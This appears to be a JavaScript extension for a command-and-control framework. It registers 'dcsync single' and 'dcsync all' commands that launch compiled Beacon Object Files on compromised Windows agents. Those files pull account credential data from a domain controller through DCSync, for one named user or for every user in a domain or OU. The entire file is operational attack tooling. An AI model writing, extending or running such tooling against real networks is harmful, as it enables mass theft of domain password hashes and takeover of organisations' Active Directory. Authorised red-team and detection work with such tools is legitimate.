var metadata = {
    name: "DCSync",
    description: "Toolkit to perform DCSync operations using BOF",
};

// Helper function to determine if input is a username or a distinguished name
function identifyInputType(input) {
    const usernameRegex = /^[a-zA-Z0-9._-]{1,64}$/;
    const dnRegex = /^(?:[A-Z]+=[^,]+)(?:,(?:[A-Z]+=[^,]+))*$/i;
    if (dnRegex.test(input)) {
        return 1;
    } else if (usernameRegex.test(input)) {
        return 0;
    } else {
        return 0;
    }
}

// Command: dcsync-single
var _cmd_dcsync_single = ax.create_command(
    "single",
    "Perform a DCSync operation on a single user",
    "dcsync single jane.doe -dc dc01.corp.local --ldaps"
);
_cmd_dcsync_single.addArgString("target", true, "Target username or distinguished name");
_cmd_dcsync_single.addArgFlagString("-ou", "ou_path", false, "OU path to search (optional)");
_cmd_dcsync_single.addArgFlagString("-dc", "dc_address", false, "Domain Controller address");
_cmd_dcsync_single.addArgBool("--ldaps", "Use LDAPS (port 636)");

_cmd_dcsync_single.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
	let target = parsed_json["target"];
	let is_dn = identifyInputType(target);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_address = parsed_json["dc_address"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int", [target, is_dn, ou_path, dc_address, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/dcsync-single." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "DCSyncing user...");
});

// Command: dcsync-all
var _cmd_dcsync_all = ax.create_command(
    "all",
    "Perform DCSync operations for all users in the domain",
    "dcsync all -ou 'OU=Users,DC=corp,DC=local' -dc dc01.corp.local --ldaps"
);
_cmd_dcsync_all.addArgFlagString("-ou", "ou_path", false, "OU path to search (optional)");
_cmd_dcsync_all.addArgFlagString("-dc", "dc_address", false, "Domain Controller address");
_cmd_dcsync_all.addArgBool("--ldaps", "Use LDAPS (port 636)");

_cmd_dcsync_all.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let ou_path = parsed_json["ou_path"] || "";
    let dc_address = parsed_json["dc_address"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,cstr,int", [ou_path, dc_address, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/dcsync-all." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "DCSyncing all users...");
});


// Register the commands for beacon and gopher on Windows
var cmd_dcsync = ax.create_command(
    "dcsync",
    "Perform DCSync operations (DCSync-BOF)",
    "dcsync {subcommand} [options]"
);
cmd_dcsync.addSubCommands([_cmd_dcsync_single]);
cmd_dcsync.addSubCommands([_cmd_dcsync_all]);

// Create main command group
var group_dcsync = ax.create_commands_group("DCSync-BOF", [cmd_dcsync]);

ax.register_commands_group(group_dcsync, ["beacon", "gopher"], ["windows"], []);